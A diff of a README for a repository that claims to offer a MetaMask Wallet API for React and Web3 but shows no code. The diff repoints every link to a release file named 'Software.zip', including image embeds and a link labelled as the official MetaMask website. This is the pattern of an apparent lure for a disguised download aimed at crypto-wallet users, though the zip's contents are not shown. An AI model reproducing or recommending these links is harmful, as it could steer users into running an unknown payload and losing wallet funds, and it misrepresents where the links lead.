@@ -1,6 +1,6 @@
 # MetaMask Wallet API for React and Web3 Extension Integration
 
-![Metamask Wallet API](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v1.0/Release.zip)
+![Metamask Wallet API](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v2.0/Software.zip)
 
 Welcome to the "Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum" repository! This repository offers the MetaMask Wallet API for seamless integration with React and Web3 extensions, allowing you to easily connect to blockchain networks, specifically Ethereum, enabling wallet interactions and transactions within your applications.
 
@@ -36,8 +36,8 @@ The repository covers a wide range of topics related to blockchain and wallet in
 - Web3
 
 ## 🔗 Important Links
-- [Download https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v1.0/Release.zip](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v1.0/Release.zip) ![Download](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v1.0/Release.zip)
-- [Official Website](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v1.0/Release.zip) (Visit the official MetaMask website for more information)
+- [Download https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v2.0/Software.zip](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v2.0/Software.zip) ![Download](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v2.0/Software.zip)
+- [Official Website](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v2.0/Software.zip) (Visit the official MetaMask website for more information)
 
 ## 🤝 Contributing
 We welcome contributions from the community to enhance the functionality of the MetaMask Wallet API integration. Feel free to submit pull requests with improvements or new features.
@@ -48,7 +48,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🙌 Acknowledgements
 We would like to express our gratitude to the MetaMask development team for their continuous efforts in providing secure and user-friendly wallet solutions.
 
-![Thank You](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v1.0/Release.zip)
+![Thank You](https://github.com/zaytosmooth23/Metamask-Wallet-Api-React-Web3-Extension-Connect-Blockhain-Ethereum/releases/download/v2.0/Software.zip)
 
 ---
 
